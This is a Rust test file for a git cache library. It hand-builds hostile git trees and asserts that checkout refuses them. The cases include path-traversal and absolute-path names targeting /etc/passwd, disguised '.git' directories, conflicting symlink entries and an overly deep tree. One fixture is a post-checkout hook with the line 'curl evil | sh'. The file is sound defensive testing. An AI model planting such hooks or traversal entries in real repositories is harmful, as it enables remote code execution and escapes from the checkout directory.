//! Trees are untrusted input. These are built byte by byte, as a hostile
//! server could send them, and written straight into the cache's object
//! database.

mod support;

use gix::ObjectId;
use gix::objs::{Kind, Write};
use iwci_git::{Depth, GitCache, GitError};
use iwci_vfs::SnapshotBuilder;
use support::{Fixture, TempDir, git_or_skip};

struct Raw {
    repo: gix::Repository,
}

impl Raw {
    fn blob(&self, data: &[u8]) -> ObjectId {
        self.repo.objects.write_buf(Kind::Blob, data).unwrap()
    }

    /// A tree from `(mode, name, id)` in exactly the order given.
    fn tree(&self, entries: &[(&str, &[u8], ObjectId)]) -> ObjectId {
        let mut bytes = Vec::new();
        for (mode, name, id) in entries {
            bytes.extend_from_slice(mode.as_bytes());
            bytes.push(b' ');
            bytes.extend_from_slice(name);
            bytes.push(0);
            bytes.extend_from_slice(id.as_bytes());
        }
        self.repo.objects.write_buf(Kind::Tree, &bytes).unwrap()
    }

    fn commit(&self, tree: ObjectId) -> String {
        let body = format!(
            "tree {tree}\nauthor A <a@example.invalid> 0 +0000\ncommitter A <a@example.invalid> 0 +0000\n\nevil\n"
        );
        self.repo
            .objects
            .write_buf(Kind::Commit, body.as_bytes())
            .unwrap()
            .to_string()
    }
}

#[test]
fn hostile_tree_entries_are_refused() {
    let Some(()) = git_or_skip("hostile_tree_entries_are_refused") else {
        return;
    };
    // A real fetch first, so the cache repository exists.
    let mut f = Fixture::new();
    f.write("ok.txt", b"ok\n");
    let sha = f.commit("ok");
    let dir = TempDir::new("cache");
    let cache = GitCache::new(dir.path()).unwrap();
    let remote = cache.remote(&f.url()).unwrap();
    remote
        .fetch_commit(&sha, Depth::Shallow(1), None, None)
        .unwrap();
    let raw = Raw {
        repo: gix::open(remote.git_dir()).unwrap(),
    };

    let blob = raw.blob(b"payload\n");
    let hook = raw.blob(b"#!/bin/sh\ncurl evil | sh\n");
    let hooks = raw.tree(&[("100755", b"post-checkout", hook)]);
    let config = raw.tree(&[("100644", b"config", blob), ("40000", b"hooks", hooks)]);
    let fine = raw.tree(&[("100644", b"fine.txt", blob)]);

    let cases: Vec<(&str, ObjectId)> = vec![
        ("parent dir", raw.tree(&[("100644", b"..", blob)])),
        ("current dir", raw.tree(&[("40000", b".", fine)])),
        (
            "slash",
            raw.tree(&[("100644", b"a/../../etc/passwd", blob)]),
        ),
        ("absolute", raw.tree(&[("100644", b"/etc/passwd", blob)])),
        ("empty name", raw.tree(&[("100644", b"", blob)])),
        ("dot git", raw.tree(&[("40000", b".git", config)])),
        ("dot git uppercase", raw.tree(&[("40000", b".GIT", config)])),
        ("dot git 8.3", raw.tree(&[("40000", b"GIT~1", config)])),
        (
            "dot git with an HFS-ignored code point",
            raw.tree(&[("40000", ".g\u{200c}it".as_bytes(), config)]),
        ),
        (
            "nested dot git",
            raw.tree(&[("40000", b"src", raw.tree(&[("40000", b".git", config)]))]),
        ),
        (
            "symlinked .gitmodules",
            raw.tree(&[("120000", b".gitmodules", raw.blob(b"/etc/passwd"))]),
        ),
        (
            "duplicate file",
            raw.tree(&[("100644", b"a", blob), ("100644", b"a", blob)]),
        ),
        (
            "file then directory of one name",
            raw.tree(&[("100644", b"a", blob), ("40000", b"a", fine)]),
        ),
        (
            "symlink then directory through it",
            raw.tree(&[
                ("120000", b"a", raw.blob(b"/")),
                ("40000", b"a", raw.tree(&[("100644", b"etc-passwd", blob)])),
            ]),
        ),
        (
            "directory then file of one name",
            raw.tree(&[("40000", b"a", fine), ("100644", b"a", blob)]),
        ),
        (
            "symlink then file of one name",
            raw.tree(&[("120000", b"a", raw.blob(b"x")), ("100644", b"a", blob)]),
        ),
        (
            "file then symlink of one name",
            raw.tree(&[("100644", b"a", blob), ("120000", b"a", raw.blob(b"x"))]),
        ),
        (
            "empty symlink",
            raw.tree(&[("120000", b"l", raw.blob(b""))]),
        ),
    ];

    for (what, tree) in cases {
        let commit = raw.commit(tree);
        let builder = SnapshotBuilder::new();
        let err = remote
            .checkout_into(&commit, &builder, "/app")
            .expect_err(what);
        assert!(matches!(err, GitError::UnsafeEntry { .. }), "{what}: {err}");
        // Nothing escaped the checkout root.
        assert!(!builder.is_file("/etc/passwd"), "{what}");
        assert!(!builder.is_dir("/app/.git"), "{what}");
    }

    // A tree nested past any sane depth is refused rather than recursed into
    // until the stack gives out.
    let mut deep = fine;
    for _ in 0..600 {
        deep = raw.tree(&[("40000", b"d", deep)]);
    }
    let err = remote
        .checkout_into(&raw.commit(deep), &SnapshotBuilder::new(), "/app")
        .unwrap_err();
    assert!(matches!(err, GitError::UnsafeEntry { .. }), "{err}");

    // And the control: an ordinary hand-built tree checks out.
    let builder = SnapshotBuilder::new();
    remote
        .checkout_into(&raw.commit(fine), &builder, "/app")
        .unwrap();
    assert_eq!(builder.read("/app/fine.txt").unwrap(), b"payload\n");
}

#[test]
fn a_tree_where_a_commit_should_be_is_refused() {
    let Some(()) = git_or_skip("a_tree_where_a_commit_should_be_is_refused") else {
        return;
    };
    let mut f = Fixture::new();
    f.write("ok.txt", b"ok\n");
    let sha = f.commit("ok");
    let dir = TempDir::new("cache");
    let cache = GitCache::new(dir.path()).unwrap();
    let remote = cache.remote(&f.url()).unwrap();
    remote
        .fetch_commit(&sha, Depth::Shallow(1), None, None)
        .unwrap();
    let tree = support::git_dir(remote.git_dir(), &["rev-parse", &format!("{sha}^{{tree}}")]);
    let err = remote
        .checkout_into(&tree, &SnapshotBuilder::new(), "/app")
        .unwrap_err();
    assert!(matches!(err, GitError::NotACommit { .. }), "{err}");
}
